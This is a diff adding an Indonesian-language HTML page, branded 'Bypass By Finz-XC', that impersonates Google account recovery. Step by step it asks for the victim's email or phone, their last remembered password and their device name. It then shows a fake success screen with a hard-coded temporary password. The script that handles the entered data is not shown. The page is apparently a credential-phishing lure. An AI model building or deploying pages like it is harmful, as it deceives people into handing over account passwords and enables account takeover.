@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bypass By Finz-XC - Pemulihan Akun Google</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <!-- Manifest untuk PWA -->
+    <link rel="manifest" href="/manifest.json">
+    
+    <!-- Meta tags untuk PWA -->
+    <meta name="theme-color" content="#4285f4">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+    <!-- Register Service Worker -->
+    <script>
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', function() {
+                navigator.serviceWorker.register('/sw.js').then(function(registration) {
+                    console.log('ServiceWorker registration successful with scope: ', registration.scope);
+                }, function(err) {
+                    console.log('ServiceWorker registration failed: ', err);
+                });
+            });
+        }
+    </script>
+</head>
+<body>
+    
+    <!-- Background effects -->
+    <div class="bg-effects">
+        <div class="bg-circle"></div>
+        <div class="bg-circle"></div>
+        <div class="bg-circle"></div>
+    </div>
+    
+    <div class="main-container">
+        <!-- Header dengan logo yang lebih ke bawah -->
+        <div class="header">
+            <div class="logo-container">
+                <div class="logo-main">BYPASS</div>
+                <div class="logo-subtitle">By Finz-XC</div>
+
+        </div>
+        
+        <!-- Halaman 1: Input Email/Telepon -->
+        <div id="page1" class="page active">
+            <div class="content-title">Pemulihan Akun Google</div>
+            <div class="content-subtitle">Masukkan email atau nomor telepon yang terhubung dengan akun Anda untuk memulai proses pemulihan.</div>
+            
+            <div class="form-group">
+                <label for="emailOrPhone"></i></label>
+                <input type="text" id="emailOrPhone" placeholder="Email atau Nomor Telepon">
+            </div>
+            
+            <button id="recoveryBtn">
+                <i class="fas fa-play-circle" style="margin-right: 12px;"></i> Mulai Pemulihan
+            </button>
+        </div>
+        
+        <!-- Halaman 2: Menghubungkan ke Server -->
+        <div id="page2" class="page">
+            <div class="loading-container">
+                <div class="loading-icon"></div>
+                <div class="loading-text">Menghubungkan ke server...</div>
+                <div class="loading-subtext">Harap tunggu sebentar</div>
+            </div>
+        </div>
+        
+        <!-- Halaman 3: Verifikasi Identitas -->
+        <div id="page3" class="page">
+            <div class="content-title">Verifikasi Identitas Anda</div>
+            <div class="content-subtitle">Masukkan kata sandi terakhir yang Anda ingat untuk melanjutkan.</div>
+            
+            <div class="form-group">
+                <label for="lastPassword"></i></label>
+                <input type="password" id="lastPassword" placeholder="Masukkan kata sandi terakhir">
+                <div class="warning-text">
+                    <i class="fas fa-exclamation-triangle" style="margin-right: 10px;"></i>
+                    Memasukkan kata sandi yang salah tidak akan mengganggu proses.
+                </div>
+            </div>
+            
+            <button id="continueBtn">
+                <i class="fas fa-arrow-right" style="margin-right: 12px;"></i> Lanjutkan
+            </button>
+        </div>
+        
+        <!-- Halaman 4: Langkah Keamanan Tambahan -->
+        <div id="page4" class="page">
+            <div class="content-title">Langkah Keamanan Tambahan</div>
+            <div class="content-subtitle">Masukkan nama perangkat yang sering Anda gunakan dengan akun ini.</div>
+            
+            <div class="device-info">
+                <i class="fas fa-shield-alt" style="margin-right: 12px; color: var(--primary);"></i>
+                Informasi ini membantu kami memverifikasi bahwa Anda adalah pemilik akun yang sah.
+            </div>
+            
+            <div class="form-group">
+                <label for="deviceName"></i></label>
+                <input type="text" id="deviceName" placeholder="handphone atau Laptop">
+            </div>
+            
+            <button id="securityBtn">
+                <i class="fas fa-check-circle" style="margin-right: 12px;"></i> Selesaikan
+            </button>
+        </div>
+        
+        <!-- Halaman 5: Memproses data akhir -->
+        <div id="page5" class="page">
+            <div class="processing-container">
+                <div class="processing-icon"></div>
+                <div class="processing-text">Memproses data akhir...</div>
+                <div class="loading-subtext">Harap tunggu sebentar</div>
+            </div>
+        </div>
+        
+        <!-- Halaman 6: Selamat! -->
+        <div id="page6" class="page">
+            <div class="success-container">
+                <div class="success-icon">✓</div>
+                <div class="success-title">Selamat!</div>
+                <div class="success-message">Akun Anda berhasil dipulihkan.</div>
+                
+                <div class="password-container">
+                    <div class="password-label">Kata Sandi Sementara Anda:</div>
+                    <div class="password-value" id="tempPassword">recovery2025</div>
+                </div>
+                
+                <div class="warning-message">
+                    <i class="fas fa-exclamation-circle" style="margin-right: 12px;"></i>
+                    Harap segera ganti kata sandi Anda setelah login untuk keamanan akun.
+                </div>
+                
+                <div class="button-group">
+                    <button id="copyPasswordBtn" class="copy-btn">
+                        <i class="fas fa-copy" style="margin-right: 12px;"></i> Salin Kata Sandi
+                    </button>
+                    <button id="closeBtn" class="close-btn">
+                        <i class="fas fa-times" style="margin-right: 12px;"></i> Tutup
+                    </button>
+                    <button id="restartBtn" class="restart-btn">
+                        <i class="fas fa-redo" style="margin-right: 12px;"></i> Mulai Ulang Proses
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <i class="fas fa-lock" style="margin-right: 10px;"></i>
+            © 2025 Bypass By Finz-XC. Hak cipta dilindungi.
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
